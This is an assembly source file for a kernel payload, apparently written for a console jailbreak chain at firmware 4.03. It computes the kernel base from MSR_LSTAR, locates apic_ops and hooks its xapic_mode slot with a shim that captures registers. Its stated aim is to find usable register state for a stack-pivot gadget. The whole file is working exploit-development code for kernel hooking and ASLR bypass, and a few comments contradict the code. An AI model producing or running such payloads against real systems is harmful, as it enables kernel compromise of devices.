/*
 * reg_probe.S — Register state capture at apic_ops[2] (xapic_mode) call site
 *
 * Runs as a kernel thread via kldload.elf's kproc_create.
 * Entry: RDI = pointer to 512-byte kthread_args buffer
 *
 * This payload:
 *   1. Finds apic_ops in kdata
 *   2. Installs a register-capturing shim as apic_ops[2]
 *   3. Waits ~1.5 seconds for the shim to fire (timer interrupts call xapic_mode)
 *   4. Restores original apic_ops[2]
 *   5. Reports captured register state
 *
 * The shim saves ALL registers on first call, then tail-calls the original
 * xapic_mode. This tells us exactly what register state is available for
 * a stack pivot gadget.
 *
 * FW 4.03 offsets:
 *   xapic_mode = ktext + 0x294340
 */

.intel_syntax noprefix
.text
.globl _start
_start:
    push rbx
    push rbp
    push r12
    push r13
    push r14
    push r15
    mov r12, rdi            /* r12 = output buffer */

    /* ---- Compute bases ---- */
    mov ecx, 0xC0000082     /* MSR_LSTAR */
    rdmsr
    shl rdx, 32
    or rax, rdx
    mov r13, rax            /* r13 = LSTAR */

    mov r14, rax
    sub r14, 0x294218
    add r14, 0xC00000       /* r14 = kdata_base */

    mov r15, r14
    sub r15, 0xC00000       /* r15 = ktext_base */

    /* Store header */
    mov rax, 0x52454750524F4245  /* "REGPROBE" */
    mov [r12+0x00], rax
    mov [r12+0x08], r14     /* kdata_base */
    mov [r12+0x10], r15     /* ktext_base */

    /* ---- Find apic_ops ---- */
    mov rax, r15
    add rax, 0x294340       /* rax = expected xapic_mode address */

    lea rbx, [r14 + 0x100000]
    lea rcx, [r14 + 0x600000]
.scan:
    cmp rbx, rcx
    jge .not_found
    cmp [rbx + 16], rax     /* check slot[2] */
    je .found
    add rbx, 8
    jmp .scan

.not_found:
    mov rax, -1
    mov [r12+0x18], rax     /* 0xFFFFFFFFFFFFFFFF = not found */
    jmp .exit

.found:
    mov [r12+0x18], rbx     /* apic_ops address */
    mov rax, [rbx + 16]     /* original xapic_mode */
    mov [r12+0x20], rax     /* save original */

    /* ---- Set up shim data ---- */
    lea rdx, [rip + shim_data]
    mov [rdx + 0], rax      /* original xapic_mode address */
    mov qword ptr [rdx + 8], 0   /* fire count = 0 */

    /* ---- Install shim ---- */
    lea rcx, [rip + xapic_shim]
    mov [r12+0x28], rcx     /* store shim address for debugging */
    mov [rbx + 16], rcx     /* HOOK: apic_ops[2] → xapic_shim */

    /* ---- Wait ~1.5s for shim to fire ---- */
    rdtsc
    shl rdx, 32
    or rax, rdx
    mov r13, 4000000000     /* ~1.5s at 3.5GHz */
    add r13, rax            /* r13 = end TSC */

.wait_loop:
    pause
    rdtsc
    shl rdx, 32
    or rax, rdx
    cmp rax, r13
    jb .wait_loop

    /* ---- Restore original ---- */
    mov rax, [r12+0x20]     /* original xapic_mode */
    mov [rbx + 16], rax     /* UNHOOK */

    /* ---- Copy results to output buffer ---- */
    lea rdx, [rip + shim_data]
    mov rax, [rdx + 8]      /* fire count */
    mov [r12+0x30], rax

    /* Copy captured registers (17 * 8 = 136 bytes) to output at 0x38 */
    /* Layout: RAX RBX RCX RDX RSI RDI RBP RSP R8..R15 RIP(retaddr) */
    lea rsi, [rdx + 0x10]   /* register capture area */
    lea rdi, [r12 + 0x38]
    mov ecx, 17
.copy:
    mov rax, [rsi]
    mov [rdi], rax
    add rsi, 8
    add rdi, 8
    dec ecx
    jnz .copy

    jmp .exit

.exit:
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbp
    pop rbx
    ret

/* ========================================================================
 * xapic_shim — Register-capturing wrapper for xapic_mode
 *
 * Called via apic_ops[2]. On first invocation, captures all GPRs and the
 * return address. Then tail-calls the original xapic_mode (push+ret trick).
 *
 * Must be safe for concurrent calls from multiple CPUs.
 * Must return the same value as the original (1 = APIC_MODE_XAPIC).
 * ======================================================================== */
.balign 16
xapic_shim:
    /* Atomically increment fire count; capture regs only on first call */
    push rcx
    push rdx
    lea rcx, [rip + shim_data]
    mov edx, 1
    lock xadd [rcx + 8], rdx   /* old count in edx */
    test edx, edx
    jnz .shim_tail              /* not first call → skip capture */

    /* ---- First call: capture all registers ---- */
    /* At this point, stack is: [saved_rdx] [saved_rcx] [ret_addr] ... */
    /* Capture the caller's original values */

    /* RAX — still original (we only pushed rcx/rdx) */
    mov [rcx + 0x10], rax

    /* RBX — still original */
    mov [rcx + 0x18], rbx

    /* RCX — caller's original is unknown (we used it), grab from knowledge: */
    /* Actually RCX was clobbered by our LEA. The caller's RCX is lost. */
    /* Store 0xCCCCCCCC as marker for "clobbered by shim" */
    mov qword ptr [rcx + 0x20], 0

    /* RDX — caller's original was pushed, it's at [rsp+8] */
    mov rdx, [rsp + 8]
    mov [rcx + 0x28], rdx

    /* RSI, RDI, RBP */
    mov [rcx + 0x30], rsi
    mov [rcx + 0x38], rdi
    mov [rcx + 0x40], rbp

    /* RSP — caller's RSP before the CALL instruction = rsp + 24 */
    /* Stack: [saved_rdx(8)] [saved_rcx(8)] [ret_addr(8)] */
    lea rdx, [rsp + 24]
    mov [rcx + 0x48], rdx

    /* R8-R15 — all still original */
    mov [rcx + 0x50], r8
    mov [rcx + 0x58], r9
    mov [rcx + 0x60], r10
    mov [rcx + 0x68], r11
    mov [rcx + 0x70], r12
    mov [rcx + 0x78], r13
    mov [rcx + 0x80], r14
    mov [rcx + 0x88], r15

    /* Return address (= caller's RIP after CALL) */
    mov rdx, [rsp + 16]    /* ret addr is at rsp+16 (past two pushes) */
    mov [rcx + 0x90], rdx

.shim_tail:
    /* Tail-call original xapic_mode via push+ret */
    /* This preserves the caller's return address on stack */
    pop rdx                 /* restore rdx */
    pop rcx                 /* restore rcx */
    /* Stack now: [ret_addr_to_caller] */
    /* Push original xapic_mode and ret to it (tail call) */
    lea rax, [rip + shim_data]
    push qword ptr [rax]    /* push original xapic_mode */
    /* Now stack: [original_xapic_mode] [ret_addr_to_caller] */
    /* But wait — ret pops original_xapic_mode, and when original does ret, */
    /* it returns to our caller. However we clobbered RAX! */
    /* xapic_mode doesn't care about input RAX, it just returns 1. */
    ret

/* ========================================================================
 * shim_data — Persistent data area for the shim
 * ======================================================================== */
.balign 16
shim_data:
    .quad 0                 /* +0x00: original xapic_mode address */
    .quad 0                 /* +0x08: fire count */
    /* Register capture area at +0x10 (17 regs * 8 bytes = 136 bytes) */
    .fill 17, 8, 0         /* RAX RBX RCX RDX RSI RDI RBP RSP R8..R15 RIP */
